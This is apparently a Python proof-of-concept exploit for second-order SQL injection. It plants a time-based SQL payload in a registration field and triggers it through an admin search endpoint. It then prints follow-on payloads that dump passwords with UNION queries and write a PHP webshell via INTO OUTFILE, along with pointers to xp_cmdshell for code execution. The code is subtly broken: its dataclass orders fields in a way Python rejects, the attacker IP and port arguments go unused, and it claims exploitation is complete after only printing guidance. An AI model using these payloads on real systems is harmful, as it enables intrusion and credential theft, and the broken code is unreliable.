#!/usr/bin/env python3
"""
Second-Order SQL Injection RCE PoC
CVE: N/A (Common vulnerability pattern)
Target: Web applications with stored SQL injection
Vulnerability: Second-Order SQLi → Data Exfiltration/RCE

Reference:
- https://portswigger.net/kb/issues/00100210_sql-injection-second-order
- https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/

Exploit Flow:
1. Identify input stored in database (registration, profile update)
2. Inject SQL payload into stored field
3. Trigger second-order execution (admin search, export, report)
4. Payload executes in different context with higher privileges
5. Exfiltrate data or achieve RCE via database functions
"""

import argparse
import requests
import sys
import time
from dataclasses import dataclass, field
from typing import Optional
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

@dataclass(slots=True)
class ExploitContext:
    """Second-Order SQLi exploit configuration and state."""

    target_ip: str
    target_port: int
    protocol: str = "http"
    register_endpoint: str = "/register"
    trigger_endpoint: str = "/admin/users/search"

    attacker_ip: str
    attacker_port: int

    username: str = "testuser"
    payload_field: str = "lastname"  # Field to inject payload
    delay: int = 5

    proxy: Optional[str] = None

    session: requests.Session = field(default_factory=requests.Session, repr=False)
    sqli_confirmed: bool = field(default=False, repr=False)
    user_registered: bool = field(default=False, repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            register_endpoint=args.register_endpoint,
            trigger_endpoint=args.trigger_endpoint,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            username=args.username,
            payload_field=args.payload_field,
            delay=args.delay,
            proxy=args.proxy,
        )

    def get_base_url(self) -> str:
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_register_url(self) -> str:
        return f"{self.get_base_url()}{self.register_endpoint}"

    def get_trigger_url(self) -> str:
        return f"{self.get_base_url()}{self.trigger_endpoint}"

    def get_proxies(self) -> Optional[dict]:
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Second-Order SQL Injection PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target_group = parser.add_argument_group("Target Configuration")
    target_group.add_argument("target_ip", help="Target IP address")
    target_group.add_argument("target_port", type=int, help="Target port")
    target_group.add_argument("--register-endpoint", default="/register", help="Registration endpoint")
    target_group.add_argument("--trigger-endpoint", default="/admin/users/search", help="Trigger endpoint")

    attacker_group = parser.add_argument_group("Attacker Configuration")
    attacker_group.add_argument("listening_ip", help="Attacker IP")
    attacker_group.add_argument("listening_port", type=int, help="Attacker port")

    exploit_group = parser.add_argument_group("Exploit Configuration")
    exploit_group.add_argument("--username", default="testuser", help="Username for registration")
    exploit_group.add_argument("--payload-field", default="lastname", help="Field to inject payload")
    exploit_group.add_argument("--delay", type=int, default=5, help="Delay for time-based detection")

    optional_group = parser.add_argument_group("Optional")
    optional_group.add_argument("--proxy", help="HTTP proxy")

    return parser.parse_args()

def stage_register(ctx: ExploitContext) -> bool:
    print("\n[*] Stage 1: Registration with SQL Injection Payload")

    # Generate time-based SQLi payload for second-order execution
    # This payload will be stored in database and executed later
    payload = f"admin' AND SLEEP({ctx.delay})-- -"

    print(f"[*] Username: {ctx.username}")
    print(f"[*] Injecting payload in: {ctx.payload_field}")
    print(f"[*] Payload: {payload}")

    registration_data = {
        "username": ctx.username,
        "email": f"{ctx.username}@test.com",
        "password": "Test123!",
        ctx.payload_field: payload  # Inject payload here
    }

    try:
        response = ctx.session.post(
            ctx.get_register_url(),
            data=registration_data,
            proxies=ctx.get_proxies(),
            timeout=10,
            verify=False
        )

        print(f"[+] Registration request sent (HTTP {response.status_code})")

        if response.status_code in [200, 201, 302]:
            print("[+] User registered successfully")
            ctx.user_registered = True
            return True
        else:
            print(f"[!] Unexpected status code: {response.status_code}")
            return False

    except Exception as e:
        print(f"[-] Registration failed: {e}")
        return False

def stage_trigger(ctx: ExploitContext) -> bool:
    print("\n[*] Stage 2: Triggering Second-Order SQLi")
    print(f"[*] Trigger endpoint: {ctx.get_trigger_url()}")
    print(f"[*] Searching for user to trigger payload execution")

    # Trigger the stored payload by searching/accessing the user
    # This could be admin search, user list, export, etc.
    search_data = {"search": ctx.username}

    try:
        print(f"[*] Sending trigger request (expecting {ctx.delay}s delay)...")

        start_time = time.time()
        response = ctx.session.post(
            ctx.get_trigger_url(),
            data=search_data,
            proxies=ctx.get_proxies(),
            timeout=ctx.delay + 10,
            verify=False
        )
        elapsed = time.time() - start_time

        print(f"[*] Response time: {elapsed:.2f}s")

        if elapsed >= ctx.delay:
            print(f"[+] Time delay detected! Second-order SQLi confirmed")
            ctx.sqli_confirmed = True
            return True
        else:
            print(f"[!] No significant delay (expected {ctx.delay}s, got {elapsed:.2f}s)")
            print(f"[!] Second-order SQLi may not have executed")
            return False

    except requests.exceptions.Timeout:
        print(f"[+] Request timed out - second-order SQLi likely successful")
        ctx.sqli_confirmed = True
        return True
    except Exception as e:
        print(f"[-] Trigger failed: {e}")
        return False

def stage_exploit(ctx: ExploitContext) -> bool:
    print("\n[*] Stage 3: Data Exfiltration / Exploitation")

    if not ctx.sqli_confirmed:
        print("[!] SQLi not confirmed, but proceeding")

    print(f"[*] For full exploitation:")
    print(f"    1. Use time-based extraction to read data")
    print(f"    2. Craft UNION-based payloads if results visible")
    print(f"    3. Use database-specific functions for RCE:")
    print(f"       - MySQL: LOAD_FILE(), INTO OUTFILE")
    print(f"       - MSSQL: xp_cmdshell")
    print(f"       - PostgreSQL: COPY, lo_export")

    print(f"\n[*] Example payloads for {ctx.payload_field}:")
    print(f"    Time-based: admin' AND SLEEP(5)-- -")
    print(f"    UNION-based: admin' UNION SELECT 1,2,password FROM users-- -")
    print(f"    File write: admin' INTO OUTFILE '/var/www/html/shell.php'-- -")

    return True

def main():
    print("[+] Second-Order SQL Injection PoC")

    args = parse_args()
    ctx = ExploitContext.from_args(args)

    print(f"\n[*] Configuration:")
    print(f"    Target: {ctx.get_base_url()}")
    print(f"    Register: {ctx.register_endpoint}")
    print(f"    Trigger: {ctx.trigger_endpoint}")
    print(f"    Payload Field: {ctx.payload_field}")

    try:
        # Stage 1: Register user with SQLi payload
        if not stage_register(ctx):
            print("\n[-] Registration failed")
            sys.exit(1)

        # Wait for database write
        print(f"\n[*] Waiting 2 seconds for database write...")
        time.sleep(2)

        # Stage 2: Trigger second-order execution
        if not stage_trigger(ctx):
            print("\n[-] Trigger failed or SQLi not detected")
            sys.exit(1)

        # Stage 3: Exploitation guidance
        stage_exploit(ctx)

        print("\n[+] Second-order SQLi exploitation completed")

    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)

if __name__ == "__main__":
    main()
